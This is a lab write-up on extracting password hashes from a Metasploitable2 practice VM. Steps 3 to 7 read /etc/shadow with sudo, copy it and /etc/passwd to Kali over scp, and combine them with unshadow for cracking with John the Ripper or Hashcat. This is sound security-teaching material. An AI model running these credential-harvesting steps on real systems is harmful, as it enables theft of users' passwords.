# 1(a) Extract Password Hashes from Metasploitable2

## Objective

Extract password hashes from the Metasploitable2 virtual machine and prepare them for password-cracking tools such as John the Ripper and Hashcat.

---

## Lab Environment

| Machine         | IP Address     | Operating System |
| --------------- | -------------- | ---------------- |
| Kali Linux      | 192.168.56.101 | Kali Linux       |
| Metasploitable2 | 192.168.56.103 | Ubuntu Linux     |

---

## Step 1: Login to Metasploitable2

### Credentials

```text
Username: msfadmin
Password: msfadmin
```

---

## Step 2: View User Accounts

### Command

```bash
cat /etc/passwd
```

### Purpose

The `/etc/passwd` file contains user account information such as usernames, user IDs, group IDs, home directories, and login shells.



---

## Step 3: View Password Hashes

### Command

```bash
sudo cat /etc/shadow
```

### Purpose

The `/etc/shadow` file stores encrypted password hashes and password policy information. Root privileges are required to access this file.

---
## Screenshot

<img width="1027" height="876" alt="image" src="https://github.com/user-attachments/assets/a34b716a-bb06-487f-aac1-79e06f7154b6" />

---

## Step 4: Create Working Directory

### Commands

```bash
mkdir ~/PasswordLab
cd ~/PasswordLab
```

### Purpose

Create a dedicated directory to store password-related files used during the lab.

---

## Step 5: Copy Password Files

### Commands

```bash
sudo cp /etc/passwd .
sudo cp /etc/shadow .
```

### Verify Files

```bash
ls -la
```

### Expected Output

```text
passwd
shadow
```

**Screenshot:** PasswordLab directory contents

---

## Step 6: Transfer Files to Kali Linux

### Command

```bash
scp -O \
-o HostKeyAlgorithms=+ssh-rsa \
-o PubkeyAcceptedAlgorithms=+ssh-rsa \
msfadmin@192.168.56.103:/home/msfadmin/PasswordLab/passwd .
```

```bash
scp -O \
-o HostKeyAlgorithms=+ssh-rsa \
-o PubkeyAcceptedAlgorithms=+ssh-rsa \
msfadmin@192.168.56.103:/home/msfadmin/PasswordLab/shadow .
```

### Purpose

Securely transfer the password files from Metasploitable2 to Kali Linux for offline password-cracking activities.

**Screenshot:** Successful SCP file transfer

---

## Step 7: Combine Password Files

### Command

```bash
unshadow passwd shadow > hashes.txt
```

### Verify Output

```bash
cat hashes.txt
```

### Purpose

The `unshadow` utility combines account information from `/etc/passwd` with password hashes from `/etc/shadow` into a single file compatible with John the Ripper.

**Screenshot:** Output of `hashes.txt`

---

## Results

* Successfully extracted password hashes from Metasploitable2.
* Accessed user account information from `/etc/passwd`.
* Retrieved encrypted password hashes from `/etc/shadow`.
* Transferred files securely to Kali Linux.
* Generated a combined hash file (`hashes.txt`) for password-cracking tools.

---

## Observation

Linux systems store user account information and password hashes separately for security reasons. The `/etc/passwd` file contains user account details, while the `/etc/shadow` file stores encrypted password hashes. By combining both files using the `unshadow` utility, the hashes become suitable for offline password-cracking techniques such as dictionary attacks and brute-force attacks.

---

## Conclusion

Password hashes were successfully extracted from the Metasploitable2 machine and prepared for offline password analysis. The generated hash file will be used in subsequent tasks involving John the Ripper, Hashcat, dictionary attacks, and brute-force password recovery techniques.

